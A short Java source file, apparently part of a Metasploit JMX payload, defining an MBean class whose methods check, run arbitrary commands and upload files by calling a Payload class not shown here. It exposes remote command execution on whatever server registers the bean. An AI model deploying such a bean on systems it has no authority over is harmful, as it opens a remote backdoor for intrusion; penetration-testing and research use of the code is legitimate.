package metasploit;

public class Metasploit implements MetasploitMBean
{
	public String check() {
		return Payload.check();
	}
	public String run(String cmd)
	{
		return Payload.exec(cmd);
	}
	
	public String upload(String R, String file_name)
	{
		return Payload.upload(R, file_name);
	}
}